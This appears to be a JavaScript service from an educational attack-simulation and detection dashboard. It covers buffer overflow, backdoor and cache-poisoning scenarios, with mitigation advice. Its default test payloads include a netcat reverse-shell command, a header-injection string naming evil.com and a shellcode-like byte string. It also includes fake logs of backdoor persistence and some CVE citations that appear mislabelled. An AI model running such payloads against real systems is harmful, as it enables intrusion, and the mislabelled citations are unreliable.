/**
 * services/simulationService.js
 * ─────────────────────────────────────────────────────────────────────────────
 * Orchestrates attack simulations end-to-end:
 *   • Generates realistic system metric fluctuations
 *   • Calls the detection engine
 *   • Persists logs / alerts
 *   • Emits Socket.io events for real-time UI updates
 * ─────────────────────────────────────────────────────────────────────────────
 */

const { v4: uuidv4 } = require('uuid');
const engine  = require('./detectionEngine');
const storage = require('./storageService');

// Holds the interval timer for the live metrics loop
let _metricsInterval = null;
let _socketEmit      = null;   // injected from socketService

// ── Public API ────────────────────────────────────────────────────────────────

/**
 * Inject the Socket.io emit function so the service can push real-time events.
 * Called once during server boot.
 */
function setEmitter(emitFn) {
  _socketEmit = emitFn;
}

/**
 * Start a named simulation.
 * @param {'buffer_overflow'|'trapdoor'|'cache_poisoning'} type
 * @param {object} [options]
 * @returns {object} initial simulation result
 */
async function startSimulation(type, options = {}) {
  const state = storage.getState();
  if (state.simulationRunning) {
    throw new Error('A simulation is already running. Stop it first.');
  }

  // Mark simulation active
  storage.updateState({
    simulationRunning:   true,
    activeAttack:        type,
    systemStatus:        'under_attack',
    startedAt:           new Date().toISOString(),
    totalSimulationsRun: (state.totalSimulationsRun || 0) + 1,
  });

  _log('info', `Simulation STARTED: ${type}`);
  _emit('simulation_started', { type, timestamp: new Date().toISOString() });

  // Generate the simulation steps
  const result = await _runAttackSimulation(type, options);

  // Start metrics loop
  _startMetricsLoop(type);

  return result;
}

/**
 * Stop the running simulation and restore system to safe state.
 */
function stopSimulation() {
  _stopMetricsLoop();

  storage.updateState({
    simulationRunning: false,
    activeAttack:      null,
    systemStatus:      'safe',
    threatScore:       0,
    cpu:               12 + Math.floor(Math.random() * 10),
    memory:            30 + Math.floor(Math.random() * 10),
    stoppedAt:         new Date().toISOString(),
  });

  _log('info', 'Simulation STOPPED — system restored to safe state');
  _emit('simulation_stopped', { timestamp: new Date().toISOString() });

  return storage.getState();
}

/**
 * Run a single synchronous detection check without persisting a full simulation.
 * Used by /api/detection/scan endpoint.
 */
function quickScan(payload, headers, attackType) {
  switch (attackType) {
    case 'buffer_overflow':  return engine.detectBufferOverflow(payload);
    case 'trapdoor':         return engine.detectTrapdoor(payload, headers);
    case 'cache_poisoning':  return engine.detectCachePoisoning(payload, headers);
    default: {
      const generic = engine.analyseInput(payload);
      return {
        attackType: 'generic',
        detected:   generic.detected,
        severity:   generic.severity,
        score:      generic.score,
        matches:    generic.matches,
      };
    }
  }
}

/**
 * Get rich metadata about a specific attack type for the Prevention section.
 */
function getAttackInfo(type) {
  return ATTACK_INFO[type] || null;
}

// ── Internal ──────────────────────────────────────────────────────────────────

async function _runAttackSimulation(type, options) {
  let result;

  const defaultPayloads = {
    buffer_overflow: 'A'.repeat(512) + '\\x90\\x90\\x90\\x90\\xeb\\x1f',
    trapdoor:        'cmd=bash&exec=nc -e /bin/sh 192.168.1.100 4444 &backdoor=true',
    cache_poisoning: 'path=/admin\r\nX-Forwarded-Host: evil.com\r\nCache-Control: no-store',
  };

  const payload = options.payload || defaultPayloads[type] || 'TEST';
  const headers = options.headers || {};

  switch (type) {
    case 'buffer_overflow':
      result = engine.detectBufferOverflow(payload);
      break;
    case 'trapdoor':
      result = engine.detectTrapdoor(payload, headers);
      break;
    case 'cache_poisoning':
      result = engine.detectCachePoisoning(payload, headers);
      break;
    default:
      throw new Error(`Unknown simulation type: ${type}`);
  }

  // Persist log
  storage.appendLog({
    attackType: type,
    severity:   result.severity,
    message:    `Simulation run — detected: ${result.detected}`,
    source:     'SimulationService',
    steps:      result.steps,
  });

  // Raise alert if threat detected
  if (result.detected) {
    engine.buildAlert({
      attackType: type,
      severity:   result.severity,
      title:      `${_titleCase(type.replace(/_/g, ' '))} Detected`,
      message:    result.recommendation,
      details:    { score: result.score, steps: result.steps?.length },
      emitFn:     _socketEmit,
    });

    // Update threat score
    const newScore = Math.min(100, (storage.getState().threatScore || 0) + result.score * 0.5);
    storage.updateState({ threatScore: Math.round(newScore) });
  }

  _emit('detection_result', result);
  return result;
}

/**
 * Simulate fluctuating CPU / memory metrics while simulation is active.
 */
function _startMetricsLoop(attackType) {
  _stopMetricsLoop();

  _metricsInterval = setInterval(() => {
    const state = storage.getState();
    if (!state.simulationRunning) { _stopMetricsLoop(); return; }

    // Generate spiky values based on attack type
    const base = { cpu: 40, memory: 55 };
    const spike = {
      buffer_overflow:  { cpuDelta: 40, memDelta: 30 },
      trapdoor:         { cpuDelta: 20, memDelta: 15 },
      cache_poisoning:  { cpuDelta: 25, memDelta: 20 },
    }[attackType] || { cpuDelta: 20, memDelta: 15 };

    const cpu    = Math.min(98, base.cpu    + Math.random() * spike.cpuDelta    + Math.random() * 10);
    const memory = Math.min(96, base.memory + Math.random() * spike.memDelta    + Math.random() * 10);
    const threat = Math.min(100, (state.threatScore || 0) + Math.random() * 3);

    const sysAnalysis = engine.analyseSystemMetrics({ cpu, memory });
    const status = threat >= 75 ? 'critical' : threat >= 40 ? 'under_attack' : 'safe';

    storage.updateState({ cpu: Math.round(cpu), memory: Math.round(memory), threatScore: Math.round(threat), systemStatus: status });

    const payload = {
      cpu: Math.round(cpu),
      memory: Math.round(memory),
      threatScore: Math.round(threat),
      systemStatus: status,
      timestamp: new Date().toISOString(),
      anomaly: sysAnalysis.anomaly,
    };
    _emit('metrics_update', payload);

    // Occasionally emit a random log line
    if (Math.random() < 0.3) {
      const logLine = _randomLogLine(attackType);
      storage.appendLog({ attackType, severity: logLine.severity, message: logLine.msg, source: 'MetricsLoop' });
      _emit('live_log', { ...logLine, timestamp: new Date().toISOString() });
    }
  }, 2000);
}

function _stopMetricsLoop() {
  if (_metricsInterval) {
    clearInterval(_metricsInterval);
    _metricsInterval = null;
  }
}

// ── Helpers ───────────────────────────────────────────────────────────────────

function _emit(event, data) {
  if (typeof _socketEmit === 'function') _socketEmit(event, data);
}

function _log(severity, message) {
  storage.appendLog({ severity, message, source: 'SimulationService', attackType: 'system' });
}

function _titleCase(s) {
  return s.replace(/\b\w/g, c => c.toUpperCase());
}

function _randomLogLine(attackType) {
  const lines = {
    buffer_overflow: [
      { msg: '[KERNEL] Stack smashing detected via canary value', severity: 'high' },
      { msg: '[MEM]    Heap corruption warning in malloc()', severity: 'medium' },
      { msg: '[NX]     Non-executable stack attempt blocked', severity: 'high' },
      { msg: '[ASLR]   Address randomisation active — mitigating ROP chain', severity: 'low' },
      { msg: '[PROC]   Segmentation fault in process PID 1337', severity: 'high' },
    ],
    trapdoor: [
      { msg: '[AUTH]   Failed login attempt from 10.0.0.42 (attempt #7)', severity: 'medium' },
      { msg: '[NET]    Outbound connection to unknown IP 185.220.101.47:9001', severity: 'high' },
      { msg: '[CRON]   Unauthorised cron job registered: * * * * * /tmp/.x', severity: 'high' },
      { msg: '[SSH]    New SSH key added to /root/.ssh/authorized_keys', severity: 'high' },
      { msg: '[PROC]   Suspicious process spawned: /bin/sh -i', severity: 'medium' },
    ],
    cache_poisoning: [
      { msg: '[CACHE]  Stale entry served — TTL overridden via header', severity: 'medium' },
      { msg: '[HTTP]   Response splitting payload detected in Location header', severity: 'high' },
      { msg: '[CDN]    Cache-Control stripped — content may be cached incorrectly', severity: 'medium' },
      { msg: '[DNS]    TTL 0 response received — possible cache flush attack', severity: 'low' },
      { msg: '[WAF]    X-Forwarded-Host mismatch blocked', severity: 'high' },
    ],
  };
  const pool = lines[attackType] || [{ msg: '[SYS] Anomalous activity recorded', severity: 'low' }];
  return pool[Math.floor(Math.random() * pool.length)];
}

// ── Attack Knowledge Base (Prevention section) ────────────────────────────────

const ATTACK_INFO = {
  buffer_overflow: {
    name:        'Buffer Overflow',
    description: 'A buffer overflow occurs when a program writes more data into a buffer than it can hold, overwriting adjacent memory regions and potentially hijacking control flow.',
    cause:       'Absence of bounds checking in C/C++ programs; use of unsafe functions like gets(), strcpy(), sprintf().',
    mechanism:   'Attacker crafts an oversized payload that overwrites the return address on the stack, redirecting execution to injected shellcode or ROP gadgets.',
    detection: [
      'Stack canary values — detect overwrite before function returns',
      'Address Space Layout Randomisation (ASLR)',
      'Non-Executable (NX) memory pages',
      'Runtime bounds checking (AddressSanitizer)',
      'IDS signatures for oversized payloads',
    ],
    prevention: [
      'Use memory-safe languages (Rust, Go, Java)',
      'Replace unsafe C functions with safe alternatives (strncpy, strlcpy)',
      'Enable compiler protections: -fstack-protector, -D_FORTIFY_SOURCE',
      'Apply OS mitigations: ASLR, DEP/NX, PIE',
      'Regular static analysis and fuzz testing',
    ],
    recovery: [
      'Immediately isolate the affected process / host',
      'Capture a memory dump for forensic analysis',
      'Patch the vulnerable code path with bounds checks',
      'Review all user-supplied input pathways',
      'Redeploy with mitigations enabled and regression tests added',
    ],
    cveExamples: ['CVE-2021-3156 (sudo Baron Samedit)', 'CVE-2000-0884 (IIS .printer overflow)', 'Heartbleed (CVE-2014-0160)'],
    cvss: 9.8,
    severity: 'Critical',
  },

  trapdoor: {
    name:        'Trapdoor / Backdoor Attack',
    description: 'A trapdoor (or backdoor) is a covert mechanism inserted into software or a system that bypasses normal authentication, granting an attacker persistent unauthorised access.',
    cause:       'Malicious insiders, supply-chain compromises, or exploitation of remote code execution vulnerabilities to install persistent implants.',
    mechanism:   'Attacker plants a hidden listener (reverse shell, cron job, or modified binary) that provides persistent remote access, often through an encrypted C2 channel.',
    detection: [
      'File integrity monitoring (FIM) on critical system binaries',
      'Network anomaly detection — unexpected outbound connections',
      'Process auditing — unexpected parent-child process trees',
      'Log analysis — unusual authentication events',
      'YARA rule scanning for known backdoor signatures',
    ],
    prevention: [
      'Code signing and software supply-chain verification',
      'Principle of least privilege — no unnecessary root/admin processes',
      'Network egress filtering — block unexpected outbound traffic',
      'Regular binary / package integrity verification (checksums, SBOMs)',
      'Immutable infrastructure — redeploy from known-good images rather than patching in place',
    ],
    recovery: [
      'Identify and remove all implants (reverse shells, modified binaries, rogue cron jobs)',
      'Reset all credentials and revoke active sessions',
      'Rebuild the host from a clean, verified image',
      'Conduct a full supply-chain audit',
      'Implement continuous runtime monitoring going forward',
    ],
    cveExamples: ['SolarWinds SUNBURST (2020)', 'XZ Utils backdoor (CVE-2024-3094)', 'PHP source backdoor (2021)'],
    cvss: 9.1,
    severity: 'Critical',
  },

  cache_poisoning: {
    name:        'Cache Poisoning Attack',
    description: 'Cache poisoning manipulates a caching layer (CDN, reverse proxy, DNS) into storing and serving malicious content, affecting every subsequent user who receives the poisoned response.',
    cause:       'Improper cache-key construction; failure to validate Host / X-Forwarded-Host headers; unkeyed input reflected in cached responses.',
    mechanism:   'Attacker injects crafted headers or parameters that alter the cached response. The cache stores the malicious version and serves it to legitimate users.',
    detection: [
      'Anomaly detection on Host header variations',
      'Cache-key mismatch monitoring',
      'Response content integrity checks (hashing)',
      'WAF rules blocking CRLF injection and header smuggling',
      'DNS response TTL anomaly monitoring',
    ],
    prevention: [
      'Validate and sanitise all headers before caching decisions',
      'Include security-relevant headers in the cache key (Vary header)',
      'Disable caching for responses that reflect user-controlled input',
      'Use strict Host header validation at the origin',
      'Implement Content Security Policy (CSP) to limit XSS impact',
    ],
    recovery: [
      'Immediately purge / invalidate all cached entries',
      'Identify the poisoned cache keys and remove them',
      'Apply WAF rules to block the attack vector',
      'Audit CDN and proxy configurations for mis-keyed responses',
      'Monitor for further poisoning attempts after purge',
    ],
    cveExamples: ['CVE-2018-8494 (Akamai cache poisoning)', 'Cloudflare cache poisoning (2019)', 'Django CVE-2019-14234'],
    cvss: 8.1,
    severity: 'High',
  },
};

module.exports = {
  setEmitter,
  startSimulation,
  stopSimulation,
  quickScan,
  getAttackInfo,
};
